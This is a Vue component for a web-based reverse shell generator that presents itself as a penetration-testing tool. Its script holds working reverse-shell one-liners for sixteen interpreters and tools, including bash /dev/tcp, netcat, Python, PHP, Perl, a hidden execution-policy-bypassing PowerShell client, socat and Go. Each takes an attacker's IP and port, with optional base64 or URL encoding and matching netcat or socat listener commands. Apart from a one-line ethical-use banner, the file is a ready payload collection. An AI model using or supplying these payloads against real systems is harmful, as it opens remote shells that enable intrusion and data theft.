<template>
  <div class="flex w-full flex-col items-center gap-4 p-4 sm:gap-0">
    <p class="text-muted-foreground mb-2 w-full max-w-6xl text-center text-sm">
      Generate reverse shell payloads for penetration testing
    </p>
    <Card class="route-transition-animation mb-4 w-full max-w-4xl rounded-2xl shadow-lg sm:mb-8">
      <CardHeader class="pb-2 sm:pb-3">
        <CardTitle
          class="flex items-center gap-1.5 text-base font-semibold sm:gap-2 sm:text-lg lg:text-xl"
        >
          <Icon icon="mdi:console" class="text-primary h-4 w-4 sm:h-5 sm:w-5 lg:h-6 lg:w-6" />
          Reverse Shell Generator
        </CardTitle>
      </CardHeader>
      <CardContent class="space-y-2.5 sm:space-y-3">
        <!-- Configuration -->
        <div class="grid grid-cols-2 gap-2 sm:gap-3 lg:grid-cols-4">
          <!-- IP Address -->
          <div class="space-y-1.5">
            <Label class="text-[10px] sm:text-xs">IP Address</Label>
            <Input
              v-model="ipAddress"
              placeholder="192.168.1.10"
              class="h-8 font-mono text-[10px] sm:h-9 sm:text-xs"
              @input="generatePayload"
            />
          </div>

          <!-- Port -->
          <div class="space-y-1.5">
            <Label class="text-[10px] sm:text-xs">Port</Label>
            <Input
              v-model.number="port"
              type="number"
              placeholder="4444"
              class="h-8 font-mono text-[10px] sm:h-9 sm:text-xs"
              @input="generatePayload"
            />
          </div>

          <!-- Shell Type -->
          <div class="space-y-1.5">
            <Label class="text-[10px] sm:text-xs">Shell Type</Label>
            <Select v-model="shellType" @update:modelValue="generatePayload">
              <SelectTrigger class="h-8 text-[10px] sm:h-9 sm:text-xs">
                <SelectValue placeholder="Select shell" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem v-for="shell in filteredShells" :key="shell.value" :value="shell.value">
                  {{ shell.label }}
                </SelectItem>
              </SelectContent>
            </Select>
          </div>

          <!-- Encoding Options -->
          <div class="space-y-1.5">
            <Label class="text-[10px] sm:text-xs">Encoding</Label>
            <Select v-model="encoding" @update:modelValue="generatePayload">
              <SelectTrigger class="h-8 text-[10px] sm:h-9 sm:text-xs">
                <SelectValue placeholder="Encoding" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="none">None</SelectItem>
                <SelectItem value="base64">Base64</SelectItem>
                <SelectItem value="url">URL Encode</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </div>

        <!-- OS Filter -->
        <div class="space-y-1.5">
          <Label class="text-[10px] sm:text-xs">Operating System</Label>
          <div class="grid grid-cols-3 gap-2">
            <button
              @click="((selectedOS = 'linux'), onOSChange())"
              :class="[
                'flex items-center justify-center gap-1.5 rounded-lg border-2 px-3 py-2 transition-all',
                selectedOS === 'linux'
                  ? 'border-primary bg-primary/10 text-primary'
                  : 'border-muted-foreground/20 hover:border-muted-foreground/40',
              ]"
            >
              <Icon icon="mdi:linux" class="h-4 w-4 sm:h-5 sm:w-5" />
              <span class="text-[10px] font-medium sm:text-xs">Linux</span>
            </button>
            <button
              @click="((selectedOS = 'windows'), onOSChange())"
              :class="[
                'flex items-center justify-center gap-1.5 rounded-lg border-2 px-3 py-2 transition-all',
                selectedOS === 'windows'
                  ? 'border-primary bg-primary/10 text-primary'
                  : 'border-muted-foreground/20 hover:border-muted-foreground/40',
              ]"
            >
              <Icon icon="mdi:microsoft-windows" class="h-4 w-4 sm:h-5 sm:w-5" />
              <span class="text-[10px] font-medium sm:text-xs">Windows</span>
            </button>
            <button
              @click="((selectedOS = 'macos'), onOSChange())"
              :class="[
                'flex items-center justify-center gap-1.5 rounded-lg border-2 px-3 py-2 transition-all',
                selectedOS === 'macos'
                  ? 'border-primary bg-primary/10 text-primary'
                  : 'border-muted-foreground/20 hover:border-muted-foreground/40',
              ]"
            >
              <Icon icon="mdi:apple" class="h-4 w-4 sm:h-5 sm:w-5" />
              <span class="text-[10px] font-medium sm:text-xs">MacOS</span>
            </button>
          </div>
        </div>

        <!-- Generated Payload -->
        <div class="space-y-1.5">
          <div class="flex items-center justify-between">
            <Label class="text-[10px] sm:text-xs">Generated Payload</Label>
            <Button @click="copyPayload" variant="outline" size="sm" class="h-6 text-[10px] sm:h-7">
              <Icon icon="mdi:content-copy" class="mr-1 h-3 w-3" />
              {{ copiedPayload ? 'Copied!' : 'Copy' }}
            </Button>
          </div>
          <div
            class="border-muted-foreground/20 bg-muted/30 relative min-h-[100px] overflow-y-auto rounded-lg border p-2.5 sm:min-h-[120px] sm:p-3"
          >
            <code class="text-[9px] leading-relaxed sm:text-[10px]">{{
              payload || 'Configure settings above to generate payload...'
            }}</code>
          </div>
        </div>

        <!-- Listener Command -->
        <div v-if="listenerCommand" class="space-y-1.5">
          <div class="flex items-center justify-between">
            <Label class="text-[10px] sm:text-xs">Listener Command</Label>
            <Button
              @click="copyListener"
              variant="outline"
              size="sm"
              class="h-6 text-[10px] sm:h-7"
            >
              <Icon icon="mdi:content-copy" class="mr-1 h-3 w-3" />
              {{ copiedListener ? 'Copied!' : 'Copy' }}
            </Button>
          </div>
          <div class="bg-primary/10 border-primary/20 rounded-lg border p-2.5 sm:p-3">
            <pre
              class="overflow-x-auto text-[9px] leading-relaxed sm:text-[10px]"
            ><code>{{ listenerCommand }}</code></pre>
          </div>
        </div>

        <!-- Warning -->
        <div class="rounded-lg bg-orange-50 p-2.5 dark:bg-orange-950/20">
          <div
            class="mb-0.5 flex items-center gap-1.5 text-[10px] font-medium text-orange-700 dark:text-orange-300"
          >
            <Icon icon="mdi:alert" class="h-3.5 w-3.5" />
            Ethical Use Only
          </div>
          <p class="text-[9px] leading-tight text-orange-600 sm:text-[10px] dark:text-orange-400">
            For authorized penetration testing and educational purposes only. Unauthorized access is
            illegal.
          </p>
        </div>
      </CardContent>
    </Card>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted, computed } from 'vue'
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select'
import { Icon } from '@iconify/vue'

const ipAddress = ref('10.0.0.1')
const port = ref(4444)
const selectedOS = ref<'linux' | 'windows' | 'macos'>('linux')
const shellType = ref('bash-tcp')
const encoding = ref('none')
const payload = ref('')
const listenerCommand = ref('')
const copiedPayload = ref(false)
const copiedListener = ref(false)

interface ShellOption {
  value: string
  label: string
  os: ('linux' | 'windows' | 'macos')[]
}

const availableShells: ShellOption[] = [
  { value: 'bash-tcp', label: 'Bash TCP', os: ['linux', 'macos'] },
  { value: 'bash-udp', label: 'Bash UDP', os: ['linux', 'macos'] },
  { value: 'netcat', label: 'Netcat', os: ['linux', 'macos'] },
  { value: 'netcat-openbsd', label: 'Netcat OpenBSD', os: ['linux', 'macos'] },
  { value: 'python', label: 'Python', os: ['linux', 'macos', 'windows'] },
  { value: 'python3', label: 'Python3', os: ['linux', 'macos', 'windows'] },
  { value: 'php', label: 'PHP', os: ['linux', 'macos', 'windows'] },
  { value: 'ruby', label: 'Ruby', os: ['linux', 'macos', 'windows'] },
  { value: 'perl', label: 'Perl', os: ['linux', 'macos', 'windows'] },
  { value: 'powershell', label: 'PowerShell', os: ['windows'] },
  { value: 'nodejs', label: 'Node.js', os: ['linux', 'macos', 'windows'] },
  { value: 'java', label: 'Java', os: ['linux', 'macos', 'windows'] },
  { value: 'socat', label: 'Socat', os: ['linux', 'macos'] },
  { value: 'awk', label: 'Awk', os: ['linux', 'macos'] },
  { value: 'lua', label: 'Lua', os: ['linux', 'macos'] },
  { value: 'golang', label: 'Go', os: ['linux', 'macos', 'windows'] },
]

const filteredShells = computed(() => {
  return availableShells.filter((shell) => shell.os.includes(selectedOS.value))
})

const shellTemplates: Record<string, (ip: string, port: number) => string> = {
  'bash-tcp': (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
  'bash-udp': (ip, port) => `sh -i >& /dev/udp/${ip}/${port} 0>&1`,
  netcat: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
  'netcat-openbsd': (ip, port) =>
    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
  python: (ip, port) =>
    `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
  python3: (ip, port) =>
    `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
  php: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  ruby: (ip, port) =>
    `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  perl: (ip, port) =>
    `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  powershell: (ip, port) =>
    `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
  nodejs: (ip, port) =>
    `(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(${port}, "${ip}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`,
  java: (ip, port) =>
    `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`,
  socat: (ip, port) => `socat TCP:${ip}:${port} EXEC:/bin/sh`,
  awk: (ip, port) =>
    `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
  lua: (ip, port) =>
    `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
  golang: (ip, port) =>
    `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
}

function onOSChange() {
  // Check if current shell type is compatible with selected OS
  const currentShell = availableShells.find((s) => s.value === shellType.value)
  if (currentShell && !currentShell.os.includes(selectedOS.value)) {
    // Select first available shell for the new OS
    const firstShell = filteredShells.value[0]
    if (firstShell) {
      shellType.value = firstShell.value
    }
  }
  generatePayload()
}

function generatePayload() {
  if (!ipAddress.value || !port.value) {
    payload.value = ''
    listenerCommand.value = ''
    return
  }

  const template = shellTemplates[shellType.value]
  if (!template) return

  let result = template(ipAddress.value, port.value)

  if (encoding.value === 'base64') {
    result = btoa(result)
  } else if (encoding.value === 'url') {
    result = encodeURIComponent(result)
  }

  payload.value = result

  if (shellType.value === 'bash-udp') {
    listenerCommand.value = `nc -u -lvnp ${port.value}`
  } else if (shellType.value === 'socat') {
    listenerCommand.value = `socat file:\`tty\`,raw,echo=0 tcp-listen:${port.value}`
  } else {
    listenerCommand.value = `nc -lvnp ${port.value}`
  }
}

function copyPayload() {
  if (!payload.value) return
  navigator.clipboard.writeText(payload.value)
  copiedPayload.value = true
  setTimeout(() => (copiedPayload.value = false), 1500)
}

function copyListener() {
  if (!listenerCommand.value) return
  navigator.clipboard.writeText(listenerCommand.value)
  copiedListener.value = true
  setTimeout(() => (copiedListener.value = false), 1500)
}

onMounted(() => {
  generatePayload()
})
</script>
